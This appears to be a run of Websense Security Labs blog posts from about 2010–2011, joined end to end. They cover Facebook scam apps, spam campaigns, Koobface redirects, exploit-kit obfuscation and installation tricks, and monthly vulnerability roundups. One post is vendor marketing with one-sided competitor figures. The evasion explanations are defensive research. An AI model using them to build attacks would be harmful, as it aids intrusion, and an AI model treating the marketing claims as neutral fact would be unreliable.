This time the application was called \"Profile Creeps\" which, like many other rogue applications before it, promises to do what Facebook simply doesn\'t allow *ANY* app to do - let us know who looks at our profile. But users are still tricked into installing apps that promise to do just this. And just like most others, the latest one leads to a survey that in the end generates money for the people behind the app. \n\n \nViral Facebook Application Toolkits\n\nSpam campaigns such as this one appear on an almost daily or weekly basis. You might ask yourself: is everybody now becoming a Facebook developer and trying to make tons of cash unleashing those annoying surveys? In essence, the answer is both a \"yes\" and a \"no\". No, not everybody is a Facebook developer, yes it\'s very easy to take on the experience and become one - or pretend to be one. You don\'t have to be a developer, but a mere $25 can buy you a Facebook viral application toolkit and unleash all the unwanted content you want onto Facebook.  \nAs an example, let\'s look at a very similar fraudulent application that \"can\" allow Facebook users to know who \"creeps\" at their profile, called \"Facebook Profile Creeper Tracker Pro\". The application asks for some permissions, shows an online survey/advertisements and tells the user at the end of the process that he/she is the one that looks at his/her own profile the most. In other words, this application should be revoked according to the terms and conditions of Facebook.\n \n\"Facebook Profile Creeper Tracker Pro\" and similar fraudulent applications process:\n\n\nThis application was built with a pre-defined toolkit called \"Tinie app\" which is a Facebook viral application template available in some variations for only $25 or even less. The next image is one of the template images in the toolkit that aims to give some directions to the buyer, besides the full-blown step-by-step guide that comes with the kit itself:\n\n \nThe buyer doesn\'t have to have development experience with Facebook, he/she just needs to follow the accompanying instructions and a working viral Facebook application is at their disposal. One of the sellers of the application describes its purpose pretty well: \n\n\n \nIf you\'re wondering what CPA lead is, it\'s the abbreviation of Cost Per Action. It\'s a program that any Web content publisher can join that allows them to install a survey on their site in order to make money. The cut with those programs is around $0.20-$2.00 and could be more or less. \nThis phenomenon of template Facebook applications like Tinie app shows how the spamming culture is consolidating more and more around Facebook, adapting to the platform and increasing what we call Web spam. \nTo protect yourself from malicious URL links and spam posts being made to your Facebook wall, try our free Defensio Facebook app.  You can download it from Defensio.com.', 'https://www.forcepoint.com/blog/security-labs/viral-and-malicious-facebook-application-25\n');

This is a wakeup call for the security industry. \nConsider these facts from a recent Miercom test:\nBlue Coat is only 18.9% effective at blocking modern malware threats\n  Cisco is only 12.8% effective\n  Blue Coat is only 29.4% effective at blocking dynamic content on the social Web\n  McAfee is only 19.8% effective\nAnd our own research shows that 20% of daily email threats are undetected by AV, UTMs, firewalls, and proxies. This is a failure of the security industry in general, and it cannot be solved with the latest DAT file.\nIn the meantime, while the rest of the industry is talking about concepts down the road, the real security paradigm shift occurred yesterday.\nWebsense® and the Websense TRITON™ architecture and product line UNIQUELY address these problems (and more). The flagship product in the enhanced TRITON lineup is Websense TRITON Security Gateway Anywhere. It is the world’s first unified content security gateway as it consolidates on-premises email and Web security on a single Websense V-Series™ appliance, complemented by cloud-based SaaS components, for ultimate efficiency and effectiveness and enterprise-class Web and email data loss prevention (not “DLP lite”).\nWebsense identifies, classifies, categorizes and understands content. The content is found everywhere: from websites, Web content and email content to applications, application traffic and data files. It resides and travels inside and outside of your organization: on the Web, over email and inside your systems; from databases to endpoints. Unified content security allows you to:\nStop bad content (from malware, exploits, and spam)\n  Block inappropriate content\n  Prevent the loss of private content (from regulated data and private data to source code and intellectual property)\n  Make sure that users can access the content — and only the content — that keeps them productive (from legitimate marketing on Facebook and cloud solutions like Salesforce.com to allowing personal browsing time while limiting bandwidth consumption and exposure to inappropriate content)\nThink about it: one interface across all of your email security, Web security and data security solutions, combined and sharing intelligence to make it greater than the sum of its parts; that same interface being able to selectively manage granular policies for workers, whether they are on premise or working remotely or at a satellite office.\nWith no network perimeter or standard endpoint to secure, the focus has to turn to securing the content itself. This revolutionary change in the way security is approached has taken Websense three years and more than $500 million in R&D to create. This is the beginning of the era of the content-secure enterprise. It is a whole new type of security that needed to emerge to combat today’s (and tomorrow’s) threats.\nUnified content security plugs the gaps that point solutions leave wide open. And none of the competing architectures will be able to match what TRITON does: If you don\'t own your own IP like ACE (Websense Advanced Classification Engine), you can never integrate and unify like TRITON, and no one else does.\nHere’s what that TRITON gives you:\nUnified Security - Websense TRITON security goes way beyond looking at signatures and packets to a deep analysis of content. This is really the only effective protection against blended threats. And it saves money.\n  Consolidation - That way there’s no bloated duplication of systems, so you save all kinds of money with a greatly reduced footprint to run your content security in. You also benefit from consolidated vendors and support.\n  Modularity - TRITON is powerful, yet simple and modular solution. The pieces snap together like Legos, so you can build the exact solution you need. Want to add full DLP next month? Enter the license key. Huge reduction in cost and complexity, all managed from a single console.\n  Websense Threatseeker Network™ and Advanced Classification Engine - TRITON is powered by the Websense Threatseeker network, which provides real-time content intelligence, and ACE which performs real-time analysis of threats, risks, and content. Because it’s real-time, ACE stops threats that legacy products let through.\nWebsense TRITON unified content security shifts the entire security paradigm. The message is clear: when you\'re ready to safely enable social media, cloud computing, and mobile; when you need to prevent data loss while reducing cost and complexity, think Websense (TRITON video).

Here at Websense Security Labs™, we want to highlight a familiar campaign theme that has been repackaged by spammers, as seen by our ThreatSeeker™ Network.\nWebsense messaging customers have been protected against this attack with ACE. \nAround mid-January, we started to see a campaign of emails trying to recruit the recipient to help with payment processing in Australia. This is typically the type of money-laundering scam where victims are offered payment for transferring money through their private bank account. Naturally, the most likely outcome is that the \"payment processing agents\" don\'t gain any money, but instead lose their own money. They may also be prosecuted by the authorities as an accomplice to the crime. \nWe still see the familiar email messages with the full offer outlined in the body of the message (see figures 8 and 9 below). In this campaign, however, to avoid anti-spam products, the criminals have introduced a different type of message. These messages use much more generic text with less suspicious wording, and contain links to compromised Web sites. This way, the text (which is randomized) doesn\'t trigger content rules. What\'s more, since the links go to domains with good reputations, the spammers hope to bypass reputation-based filtering. \nIf all this sounds familiar, you\'re right: this is the same technique spammers were using in pharmaceutical and OEM software spam campaigns back in October 2010. (These are still going on, by the way. See figure 4). \nAs long as we can remember here at Websense Security Labs™, spammers have been recycling as much as possible, from expired domain names to images, and, of course, HTML templates. In this case, we see an age-old scam get new life when it\'s repackaged in a template already used for pharmaceutical spam. \nSo, let\'s follow the pictures to take a look at this enticing, career changing, offer. \n \nThe messages arrive in these formats: \nFigure 1:\n\n \nFigure 2:\n\n \nBut the older style is still in the wild:\n \nFigure 3:\n\n \nDoesn\'t this look like the pharmaceutical spam we\'ve been seeing since last October?\n \nFigure 4:\n\n \nAnd, lo and behold, this template has been appearing in dating spam, yet another recycling effort:\n \nFigure 5:\n\n \nBeyond the similar physical appearance of the examples, the HTML source shows common structures that lead us to believe the templates came from the same author. The URL query structure is also very similar, providing a further hint to the common source. Most, but not all, of the messages also share some common header attributes.\nAdmittedly, it initially seems like a stretch to compare the first two examples (figures 1 and 2) to the older style, but without going into specifics, we can say the HTML source shows how spammers like to recycle templates. The URL and header patterns are too similar to be a coincidence.\n \nSome of the many subject lines are:\n \nA wonderful job offer for you!\n  Apply Now! Only few positions left!\n  Apply Now!

The language is far from the broken English used by older fraud attempts. There is a very large FAQ section trying to convince visitors that everything is legitimate.\n \nBy omitting the target site and job details from the email message, the criminals are trying to increase the chance that a few uninformed users will fall into the trap, however unlikely that may be.\n \nUsing links to pages on compromised, legitimate sites, while still crude, can help bypass spam filters. Avoiding \"incriminating\" phrases and using more generic randomized text also make it more difficult to for content-based filtering.\n \nWe predict more of these attempts in the future, most likely using more sophisticated, spoofed sites that will try to snare more victims.\nThe more general conclusion we can derive from this is that even smaller-scale scam operations benefit from spammers\' botnets, which make it easy to reach more victims. The spammers can easily create new campaigns (for their \"customers\") by recycling existing templates, and then automate the \"repackaging\" process that uses compromised domains, URL shorteners, or free hosting domains.\n \nAs always, we recommend that you never click on any links found in unfamiliar emails, and that you use common sense. If an offer sounds too good to be true, it probably is.\nNow, excuse me, but there\'s a beautiful woman who viewed my profile online (figure 5) and fell in love with me.

Can you guess who we are talking about? Gawker Media did not receive good PR this time.\nOnce again, an undisclosed number of customers\' private details such as email addresses, contact information, and birthdates were leaked from the McDonalds database. There were no burger give-aways though.\n \nBrowser and friends\nGoogle reacted to the threats exploiting PDF and Flash. Sandbox, a Google technology, is a method of isolating an application from the rest of the operating system while tightly controlling its resources. The Chrome 8.0.552.215 update includes a new built-in PDF viewer that is secured in Chrome\'s sandbox. PDF files are contained within the sandbox environment. Twelve vulnerabilities were fixed in this version. In mid December, Google extended the sandbox to support Adobe\'s Flash Player plug-in in its Chrome browser.\nTwo zero-day vulnerabilities were found in Internet Explorer. One of the vulnerabilities, CVE-2010-3971, allows remote attackers to cause a denial of service and execute arbitrary code via multiple @import calls in a crafted document. Details can be found here.\nMozilla released a security update to patch 11 vulnerabilities, 9 of which are rated \"critical\" because they can be used to run attacker code.\nApple shipped a new version of QuickTime Player with 15 security holes fixed.\n \nMicrosoft\nOn Black Tuesday December 2010, Microsoft released 17 bulletins intended to patch 40 vulnerabilities across Windows, Office, Internet Explorer, SharePoint Server, and Exchange. Of the bunch, 2 bulletins were rated critical, 14 important, and 1 moderate. \nIn total, Microsoft delivered 106 security bulletins in 2010, the highest number in history.\nMicrosoft was also confronted with 2 zero-day vulnerabilities this month. The first vulnerability (CVE-2010-3971) targets the way Internet Explorer handles Cascaded Style Sheets (CSS). The second vulnerability is found in Microsoft WMI Administrative Tools WBEMSingleView.ocx ActiveX control. Both exploits can be used by remote attackers to take complete control of a vulnerable system.\n \nHello ThreatSeeker. You\'ve got mail!\nSpam levels declined in December compared with November 2010.  There were 2 significant points in December.\nFirst we saw a drastic decrease in the output of spam from bots, particularly Rustock.  This became apparent during Christmas time.\nAn increase in spam output was seen on January 10. However, spam levels are still not yet back to November levels.\nAlso significant in December was the New Year-themed spam output from a bot widely speculated as being associated with Waledac/Storm. Spammers were up to their usual social engineering tricks pushing out Happy New Year videos.\n\n\n\n\n\n\nSecurity Trends\nGallup\'s 2010 crime survey found that computer-related crime is a growing problem for average Americans. Eleven percent of U.S. adults reported tha tduring the past year, they or a household member were victims of a computer or Internet crime on their home computer. This is up from the 6% to 8% level found in the previous 7 years.\nA new Android Trojan called Geinimi emerged from China on the end of December 2010 displaying botnet characteristics. The malware compromises a significant amount of information on a user\'s Android smartphone and sends the information to remote servers. The information it collects includes location coordinates and unique identifiers for the device (IMEI) and SIM card (IMSI). \nOn the topic of computer security for 2011 you may be interested to read our Threat Report which details the threats that we predict will pick up pace in 2011.  Read it here.\n \nThis month\'s roundup contributors:\nCarl Leonard\n  Lei Li\n  Ivan Sabo\n  Ulysses Wang\n  Xue Yang', 'https://www.forcepoint.com/blog/security-labs/month-threat-webscape-december-2010\n');

The campaign is spreading via direct messages sent from compromised accounts. Websense customers have been protected against this attack with ACE. \nSample message:\n\n \nSome observations on employed tactics by Koobface\nOne of the tactics employed by the Koobface gang is to attempt to obfuscate the malicious URL that is linked in each message. In message shown above, this is done by adding \"hpPg\" just before the valid URL link--an obvious attempt to avoid detection by security software and by the Facebook security team. The addition at the start of the URL makes it unclickable, but this is unlikely to stop determined users from copying and pasting the link directly into the browser. Another tactic is the use of open redirects on the facebook.com domain itself. This gives the URL a more credible look (social engineering), as well as helping it pass basic security checks. Usually, Facebook alerts users if they\'re about to browse to a link outside of its domains, but no alert is triggered in this case. \nIn the message above, the open redirect on facebook.com points to a bit.ly shortened link. The redirector at bit.ly points to a compromised Web site controlled by Koobface. The compromised site checks whether the request was referred from facebook.com. If it was, then it serves a dynamically generated script that further redirects to a malicious site. The malicious site requires \"a missing Flash plug-in\" in order to play a \"video,\" a.k.a., a variant of the Koobface worm. At the time of writing, the variant had a 23% detection rate.\n \nAn example redirection chain:\n \nhttp://www.facebook.com/[removed]bit.ly/g1[removed]\n==>> http://bit.ly/[removed]\n==>> [removed].com/24uqy7e/?md5=f6d9f0efc395fc0f331028c23f9fa5b9&page=12263\n==>> [removed].net/jxjv0z2s/? \n \n\n\nThere are some checks in place to make sure that the request came from Facebook. If the request at the first step of the redirection didn\'t originate from facebook.com, a fake Google News page is presented rather than further redirecting to the malicious fake video Web site.\n \n[removed].com/24uqy7e/?md5=f6d9f0efc395fc0f331028c23f9fa5b9&page=12263\n \n\n \n[UPDATE] - One reader commented that the the redirection to the malicious page can take place if any URL (not just facebook.com variations) is as referrer field in the request header at the second stage request (the request to [removed].com/24uqy7e/?md5=f6d9f0efc395fc0f331028c23f9fa5b9&page=12263). This is correct and has been verified, also it seems that a valid browser user agent must also be set in the request header in order to redirect to the malicious page. If a referrer is not set at all, the response will not present a fake Google News page any more, but a fake Facebook page that requires a login, The page is set up for harvesting credentials, once a victim enters his/hers credentials in, they\'re redirected to facebook.com and attempted to automatically be logged in. It seems that Facebook detects that an invalid attempt was made to login to their platform and notify the user. Beware that if the correct credentials were entered to the phishing page then Facebook may have stopped a potential attack on the victim\'s account but the credentials are deemed to be stolen and should be changed immediately.', 'https://www.forcepoint.com/blog/security-labs/new-koobface-campaign-spreading-facebook\n');

Leading the charge will be a series of blended threats…\nFirst, expect Stuxnet sequels. Because it takes a substantial amount of time to develop advanced persistent threats like Stuxnet, we predict similar exploits will be carried out once or twice in 2011.\nSecond, companies will struggle to stay secure while covering more ground. Today’s threats continue to morph based on where/how companies do business. Blended threats (like Zeus and SpyEye) will continue to evolve and use a variety of delivery methods. Malicious content is no longer binary files delivered in attachments; it is script-based or embedded within rich media. As our previous Insights post referenced, many threats spread rapidly through social media. This is going to continue be a challenge as 13 percent of all Web traffic is going to Facebook and this number continues to increase as more businesses use social media.\nWhile many cybercriminals are nearly 100 percent focused on stealing corporate data to make money – most IT professionals don’t have the bandwidth to personally secure every Web page and email employees use. 52 percent of data-stealing attacks were conducted over the Web and another nine percent happened over email last year.\nIn 2011, strained IT departments will need to defend more territory and allow more Web access, despite increasingly sophisticated threats. Cybercriminals know that legacy technology simply looks for the signature or reputation of threats that are known, which is why they are so successful at exploitation.\nAnd finally, we anticipate malware exploit kits will add zero-day vulnerabilities faster, increasing their use in drive-by download attacks. As more targeted attacks are researched, more zero-day vulnerabilities will be discovered. Blended threats are ever-evolving and tested by cybercriminals on anti-virus before they are released. Our research also showed the prevalence of the threats currently out there. Users of the top 1,000 sites are only two clicks away from malware at any given time. And, we saw a 111.4% increase in the number of malicious websites from 2009 to 2010.\nThe reality is security needs to be designed for the way we do business.

While reviewing incidents and deobfuscating a Web site today, I discovered an installation of a particular exploit kit that won\'t work after New Year\'s Eve.  The site I found caught my attention because the code simply looks like garbage.  As the saying goes, \"One man\'s trash is another man\'s treasure.\"  So I started digging into the obfuscation of the code and found something that I thought would be topical considering today\'s date.  The code in this exploit kit will actually expire at midnight on New Year\'s Eve local time!  In this post, I\'ll cover how I came across this and show you how and why the exploit kit installations will expire. \nHere is a screen shot of the code in the original state as I found it:\n\n \nYou may notice right off the bat that there is a Java exploit in there, but the focus of this post is in the obfuscated script that is meant to exploit the client browser.  If you have read any of my previous blog posts, you know that I tend to zero in on long streams of data in an obfuscated script.  More often than not, that is where the multiple exploits of an obfuscated script live, and also usually where the deobfuscation routine can be found.  So let\'s have a look at that part of the script and beautify it a bit so that we can see more clearly what is going on.\n \nHere is a screen shot of the part we want to focus on:\n\n \nThe attack script is obfuscated in the var w declaration above.  We can see that variable holds a long string of digits. We can also see that there is a masked String.fromCharCode a little further down in the script.  Right away, we might assume that this is a simple character code obfuscation, but with numbers like 1001, 1361, 426..., this assumption would be incorrect.  Just looking at the script for a bit, we can see what is going on for the deobfuscation.  A loop is usingString.fromCharCode to generate characters from the difference between the latter half of w and the first half of w.  However, this is not the focus, and the funny part, of this blog posting.  \nWhen you look at the above script, you can see that the Date() object is used to get the current date from the client JavaScript engine.  Later, we see that the object iilq, which is where the date is assigned, uses the getFullYear() method and subtracts 1 from the current year.  Up until December 31, 2010 11:59:59 local time, this resutl will be 2009.  At this point, var qgy looks like e2009al, so we can see that this variable is meant to be a masked eval.  To be used as an eval, this variable has to be unmasked, which is done in the following statement of .replace(\"2009\",\"v\").  The whole execution of the attack script depends on this eval. So what happens in 2011?  The varable will remain a masked eval (which will look like e2010al) because the following .replace will not work, which in turn renders the script benign! \n \nHere is what the attack script will look like until December 31, 2010 11:59:59:\n\n \nIn conclusion, we can only assume that this was an unintended mistake by the exploit kit writers and that it will probably be fixed.  However, I\'m sure they were unaware of this mistake, as the obfuscation of their attacks is probably contracted out, or they use off-the-shelf software to obfuscate their kits.  Come New Year\'s Day, we will all be just a little safer out on the Web because of this!  Happy New Year all!!', 'https://www.forcepoint.com/blog/security-labs/2011-exploit-kit-wont-work\n');

And on the next page you have a form to fill out for various resources.  I\'m not going to show you this form for the reason that it contains sensitive information.  However, I will show you the result after filling out the form so that you can see the randomized page names and what has to be done to activate the kit.\n \nThis is a look at my current working directory before the install of Phoenix Exploit\'s Kit:\n\n \nHere is the same directory after the completion of the install script:\n\n \nAs you can see, the install script contains just about everything needed to install the kit.  It extracts the necessary scripts and randomizes the file names, and thus the purpose of the file.  If you have a look at the code in each file, you can begin to figure out the purpose of each file.  The thing to notice and realize from here is that each installation creates unique names for each of the pages.  Again, what this means is that a researcher can\'t find statistics for an installed kit after finding the page serving up the exploits.  Rather, for any given kit installed in the wild, it\'s anybody\'s guess as to the names used for statistics and other pages used by that kit! \n \nRegarding the installation we\'ve been examining, at this point the kit isn\'t at all usable because it doesn\'t yet contain the exploits.  To obtain the exploits, the purchaser of the kit must contact the developer to activate their kit.  The \"installation success\" page explains this: \"To activate this installed copy of Phoenix Exploits Kit please send the following activation string to the author.\"\n \nHere is a screen shot of the installation success page:\n\n \nIn summary, we can see that the developers of Phoenix Exploit\'s Kit are working on not only protecting their exploit code from being recognized, but also their installations.  This makes it difficult for researchers to further dissect and understand how the kit works, especially if a researcher comes across just the install script.  It also makes things more difficult for others who want to study and report on the statistics found from individual installations of Phoenix by randomizing the page names used in the kit installations.', 'https://www.forcepoint.com/blog/security-labs/installation-protection-mechanisms-phoenix-exploits-kit\n');

Websense Security Labs is monitoring the situation, and we will update this blog post as we discover more. Websense customers are protected by our real-time analytics in ACE.  \nThe first vulnerability CVE-2010-3971 targets the way Internet Explorer handles Cascaded Style Sheets (CSS). When parsing an HTML page that contains a recursive CSS import, some memory is released but later referenced and re-used, and can lead to arbitrary code execution. All Internet Explorer versions 6, 7, and 8 can be affected by this vulnerability. The effectiveness of the exploit on Internet Explorer 9 hasn\'t yet been verified. \nThe use of built-in protections of DEP and ASLR on the Windows platform and Internet Explorer doesn\'t guarantee to stop the exploit. It stems from the fact that the affected DLL mscorie.dll used by Internet Explorer wasn\'t compiled to support ASLR - this fact allows an attacker to also bypass DEP by using ROP (return to oriented programming) and successfully exploit the system. Microsoft offers other ways to mitigate this vulnerability before a patch is released in their blog. You can find more information about the vulnerability in the security advisory released by Microsoft.\n\n \nThe second vulnerability tak<es advantage of the Microsoft WMI Administrative Tools ActiveX Control. Internet Explorer is vulnerable only if Microsoft WMI administrative tools is installed. The vulnerability is the result of a design flaw where the AddContextRef() and ReleaseContext() functions of the WMI Object Viewer control can be passed an object pointer that can result in arbitrary code execution. An Internet Explorer user with WBEMSingleView.ocx installed can be exploited by visiting a malicious Web page. If the ActiveX control is installed, the vulnerability can be mitigated by applying the kill biton the affected CLSID {2745E5F5-D234-11D0-847A-00C04FD7BB08}. \nBoth vulnerabilities were first disclosed by WooYun.org.\n\n\n \nMetasploit added modules for the two vulnerabilities.

Organizations are adopting it at a rapid pace, looking to take advantage of the huge benefits social media offers. McKinsey recently released astudy illustrating the adoption and benefits of social media. ReadWriteWeb just posted the 10 Ways Social Media Will Change in 2011, a good look at the advantages of communicating over the social Web. However, there is one area both of these pieces miss entirely and, in fact, is one of the biggest challenges CISOs and CSOs are facing in 2011: The security of social media.\nHere’s what we know: Attacks using social media are already prevalent and will increase in 2011. Cyber criminals will continue to enjoy the social media playground. \nOur own statistics show that 13 percent of all Web traffic is going to Facebook and this number continues to increase as more and more business use social media as a means for marketing, recruiting and even training. Without the proper security measures and policies in place, the social Web can quickly turn from a gold-mine opportunity to a serious data risk.\nWhy? Because businesses today are four times more likely to experience a data breach over the Web, than email.  For example, employees will inadvertently post confidential corporate data to social networking sites or click on an infections link – compromising an entire system. On the flip side, cyber criminals are taking advantage of user generated content on social media sites. For example, in 2011 we’ll see cyber criminals:\nManipulate social media search algorithms to trick users into visiting fake brand and celebrity pages and increase exposure to malware. While the algorithm is harder to manipulate than traditional search sites, as these social networks become an increasingly large destination portal for all things, we believe that the manipulation is likely in the coming year. Yes, SEO poisoning will move to the social Web.\n  Steal user’s social network credentials. If you think of the social Web as an increasingly relevant portal for all information, these credentials become more valuable. While it is a broad user issue, it will become increasingly targeted. It’s very reasonable to anticipate that the bad guys will look to selectively steal the social media credentials of high profile users to push their links and drive followers and fans to traps on the Web.\n  Send Web spam directly to social network users. We’ve already seen this to a certain degree and can only expect it to increase in the coming year.\n  Post Web spam as comments or responses on user’s profiles and blogs. Comment spam is likely to stay at the same amazingly high level, but more of the spam will be used to send malicious links.\n  Capitalize on the reputation of social networks to host malicious user generated content. You electively select who you friend and follow, so an inherent degree of trust is placed in their content. This is the ultimate goal for the bad guys, exploiting the “trust factor” on the social Web to manipulate users into clicking.\nIn today’s world, turning off access to Facebook and Twitter is simply disruptive to a business. You can no longer ignore the enormous value that the social Web brings to the enterprise. Those that do will run the risk of being perceived as an industry laggard or worse - losing a critical segment of an emerging market. While at the same time, we simply cannot turn a blind eye to growing security risks associated with this dynamic Web platform. In order to embrace social media, businesses need to find a way to employ three key aspects of effective enterprise social networking: safety, productivity and compliance.

In other parts of Asia, India\'s number 1 financial portal (moneycontrol.com) was also compromised and injected with a malicious iframe. \nMalicious hackers capitalized on important local and global events, such as midterm elections (US), Veteran\'s Day (US), andPrince William\'s engagement (UK), to infect more Web users via poisoned search engine results. This scam is of the usual garden variety: fake antivirus Web sites, or sites offering fake Adobe updates and fake Firefox updates, which prompt a user to download an .exe file that is really malware.\n \nWeb 2 dot uh oh\nGoogle recently launched \"Google Instant Previews,\" a new service that aims to give Google-rs a bird\'s eye view of what the site they are about to visit looks like.  This service should initially protect users against unwanted content, but ourresearch proves that it could mislead users when snapshots used in the service are not as current as assumed.\nSocial engineering is the game in Facebook this month. Our Defensio Facebook App spotted scam wall posts containing a link that attempts to post on the victim\'s behalf.  Phishing messages claiming to be from Facebook Security warn that a user account will be deactivated unless it\'s reconfirmed.  The phishing page itself is either loaded from within Facebook via iframe or redirected from the link provided in the message.\n \nBrowser and friends\nAdobe released a security update for Adobe Flash Player in early November. Eighteen security holes have been patched, including vulnerability CVE-2010-3654, which is a zero-day vulnerability in the wild found in October. \nAnother zero-day vulnerability (CVE-2010-4091) has been identified in Adobe Reader 9.4 (and earlier versions) and Adobe Acrobat 9.4 (and earlier versions). A proof of concept has been published that it could lead to a Denial of Service, although that has not been demonstrated. Arbitrary code execution may be possible. Adobe patched the hole in 2 weeks; the security update is here. \nA vulnerability in Shockwave Player has been discovered. Successful exploitation allows the execution of arbitrary code, but a user must be tricked into opening the \"Shockwave Settings\" window when viewing a Web page. \nGoogle patched several high-risk vulnerabilities in Chrome 7.0.517.44. A $7500 award was paid out of Google\'s new vulnerability reward program.\nA Denial of Service vulnerability has been found in Firefox 3.6.12. The proof of concept is published here. \nThe recent security update for Safari 5.0.3 and 4.1.3 contains 27 patched vulnerabilities. More than 40 vulnerabilities have been patched in iOS 4.2. Click here for details.\n \nMicrosoft\nThis month\'s round of \"Black Tuesday\" Microsoft patches was rather light, but contained fixes for some particularly severe issues. \n  On the unpatched side, Windows is currently vulnerable to 2 known privilege escalation exploits, one of which was found in a kernel API, allowing users to bypass user account control (UAC) entirely. The second, an exploit originally used in StuxNet, attacked the Windows Task Scheduler. \nInternet Explorer once again finds itself host to an actively exploited bug (CVE-2010-3962) caused by a dereferencing error.\n \nHello ThreatSeeker. You\'ve got mail!\nAn increase in the number of phishing emails has been a focal point over the course of this month. Most of them seem to be directed attacks at Email Service Providers (ESPs) in order for the attackers to gain access to \"industry-grade email deployment systems\" to do their bidding.  Spear-phishing, as it is known to most, is on the rise with several of these messages having the look and feel of legitimate requests to the unsuspecting user.  Like most of the email campaigns reported in the past, the format is usually the same: A user is lured into clicking a link within an email or to open an attachment, which results in the machine being infected. \nAlso in this month, with the release of the new, improved version of Adobe Reader, came the recycled phishing email messages enticing and advising users to upgrade  their readers to the newer version with all the bells and whistles.  As reported in Lenny Zeltser\'s blog, the format of these messages did not change much.  These types of email messages are not new, although it is interesting to note that cyber-criminals are keeping abreast of current changes and news and taking advantage of them.\n\n \n\n \n\n \n\n \n\n \nSecurity Trends\nA new version of the GpCode ransomware has been detected, using RSA-1024 and AES-256 as crypto-algorithms. It is now stronger than before, because it overwrites data in the files instead of deleting it after encryption, so users cannot get data back by using data-recovery software.\nGoogle announced an experimental new vulnerability reward program that applies to Google Web properties. Google said it would pay the bounty for any serious bug that “directly affects the confidentiality or integrity of user data.”\n  Adobe released the Reader X version on November 19, 2010. A built-in sandbox feature has been implemented to contain the damage from potentially malicious PDF files. Adobe\'s blog posted a multi-part series about the new sandboxing technology used in the Adobe Reader.\n  A security researcher named Nitesh Dhanjani has discovered that a rogue Web site, or a Web site whose client code may have been compromised by a persistent XSS, can pull the user out of the Safari browser in iOS.

This worm, known as Boonana, lured users into installing a Java applet when the link enclosed with the message was clicked.  When users allowed the installation, other malicious components downloaded.  A closer look at the Boonana code sparked further interest since it contained codes indicating that it was targeting Mac OS X. \nA new zero-day vulnerability (CVE-2010-3654) was discovered in Adobe Flash Player at the end of October. The vulnerability caused a crash and potentially allowed an attacker to take control of the affected system. Here are some details. A PDF file with an embedded flash file object exploited this vulnerability. And another zero-day vulnerability (CVE-2010-3653) was found in Adobe Shockwave Player. Here, a remote attacker could exploit the vulnerability to execute arbitary code or cause a denial of service. This was done via a director movie with a crafted rcsl chunk. The exploit code is published here. Also a new mega patch for Adobe PDF Reader was released, and 23 security holes have been fixed. \nMozilla released 9 bulletins in the middle of October, including 5 critical updates. The Noble Peace Prize\'s Web site was compromised, 0 day vulnerability (CVE-2010-3765) in Firefox was exploited to drop a Belmoo trojan on unsuspecting visitors\' systems, and Mozilla patched the vulnerability very quickly. \nGoogle released a security update for its Chrome browser to fix 11 vulnerabilities. \nOracle delivered a mega patch for Jave SE and Java for business. 29 security vulnerabilities were fixed. And the patch for Java on Mac OS was released here. \nAccording to RealNetworks, 7 vulnerabilities in RealPlayer were fixed here.\n \nMicrosoft \nMicrosoft sent out an astounding 16 bulletins meant to patch 49 vulnerabilities in the Windows operating system, Internet Explorer, .NET framework and Microsoft Office on October\'s Black Tuesday.  Patches for vulnerabilities that could allow remote code executions in Internet Explorer (MS10-071), Media Player Network Sharing (MS10-075), Embedded OpenType Font Engine (MS10-076) and .NET Framework (MS10-077) are deemed to be the most critical fixes and should be treated with high priority this month. \n \nHello Threatseeker. You\'ve got mail!\nThis month, Websense Security Labs saw spammers returning to some of their trickiest treats to fool email recipients.  Sorry, I couldn\'t resist the Halloween reference since it\'s October.  We saw that spammers were stuffing their messages with legitimate content to try and evade spam filters.  With one of the many campaigns we saw this month, the messages were leading to an unfamiliar target called World Pharmacy.  These messages were interesting because they were abusing legitimate site reputations much in the same way malicious attackers usually do.  The links in the messages were leading to URLs injected into legitimate sites which were meant to simply redirect to these World Pharmacy spam sites.  In an extension to this campaign, we also saw that spammers were attempting to take advantage of the ultimate reputation by using Google Translation services to redirect to software sites. \n\n \n\n \n\n \n\n \n\n\nSecurity trends\nA PDF vulnerability was found on BlackBerry Enterprise Server that the BlackBerry Attachment Service runs on. Thissecurity hole discovered in the PDF distiller could allow a malicious individual to cause buffer overflow errors, leading to a Denial of Service (DoS) condition or possibly arbitrary code execution.This occurred when users opened PDFs on their Blackberries. \n  Microsoft has added Zeus disinfection instructions onto its malicious software removal tool (MSRT). It nuked Zeus (also called Zbot) 281,491 times from 274,873 computers in one week. MSRT scans Windows computers for infections by specific, prevalent malicious software. This tool is updated and released on the second Tuesday of each month, and Zbot is the latest addition to MSRT’s ever-growing list of malware. \n  A vulnerability for iPhone was posted to a MacRumors forum by a New Zealand iPhone user who figured out a sequence of key taps that rendered the passcode useless. It\'s a trivial way to bypass the four-digit passcode lock on fully patched iPhone (iOS 4.1) devices.\n  Security researchers found that the first version of the Koobface malware targeting Mac OS X users was spreading via links in messages on social networking sites such as Facebook, MySpace, and Twitter. The malicious Web sites attempted to trick Mac OS X users into running the Java applet  to open a video file.\n  The past few months have been very busy with zero-day flaws affecting popular products.

Among other features, the version is going to include a very important security feature that will allow users to view documents safely within a sandbox environment, adding a layer of protection to the product. Until the new version is released, there will be a lot of talk about it, which presents an opportunity to cyber criminals. \n\"Piggybacking\" software has been circulating for some time now, and the upcoming Adobe Acrobat X launch is a great opportunity for it to rear its ugly head again. The term \"piggybacking software\" refers to programs that use the reputation of popular free or paid software to sell the exact same software under false pretences (for example, by claiming that it has enhanced features), or to sell slightly different software with limited added functionality. In both cases, the software is presented in a misleading way as an updated version of the genuine software. \nPiggybacking software is usually found on Web sites that: \n1. Are very low reputation sites or template sites \n2. Use the original software brand name, themes, and colors\n3. Present the same features the original free software or service\n4. Sell the same features the original software or service offers, possibly adding very limited functionality\n5. Spread through spam, Web spam, or proxy Web sites\n6. Are not affiliated with the offered software or service, and have a limited refund policy, if any\n \nThe table shows an example of what is meant by low reputation. All the sites in the table below sell piggyback software. At some point, all of the sites shared the same IP address, registered for a relatively short period of time, used the same templates with various different names, and used the anonymous domain registrar \"Domains By Proxy.\" You can see Adobe is a popular target, but there are also others:\n \nHostname\n      Website exists for\n      Target\n    download-2010-version.com\n      4 months+\n      Adobe Acrobat\n    latest-2010-version.com\n      4 months+\n      Adobe Acrobat\n    latest-new-pdf-download.com\n      20 days\n      Adobe Acrobat\n    new-earth-online.com\n      1 month+\n      Google Earth\n    new-online-version.com\n      5 months+\n      Limewire           \n    official-pdf-download.com\n      2 months+\n      Adobe Acrobat\n    official-pdf-pro.com\n      2 months+\n      Adobe Acrobat\n    official-pdf2010.com\n      2 